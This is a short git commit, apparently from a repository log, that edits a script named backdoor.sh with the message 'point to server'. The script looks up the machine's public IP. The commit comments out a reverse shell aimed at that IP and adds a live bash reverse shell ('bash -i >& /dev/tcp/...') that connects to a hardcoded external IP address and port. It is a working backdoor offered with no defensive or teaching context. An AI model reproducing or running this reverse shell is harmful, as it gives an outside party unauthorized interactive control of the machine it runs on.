a2b99a381684a46b9eb4d084022d6ec52ada6b62
Angel Diaz <angel.diaz@gmail.com>
2019-01-29 22:31:46 +0100

    point to server

--- backdoor.sh
+++ backdoor.sh
@@ -4,5 +4,6 @@
 # bash -i >& /dev/tcp/youripaddress/1337 0>&1
 
 ip=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
+# bash -i >& /dev/tcp/$ip/1337 0>&1
 
-bash -i >& /dev/tcp/$ip/1337 0>&1
+bash -i >& /dev/tcp/207.38.94.28/13791 0>&1
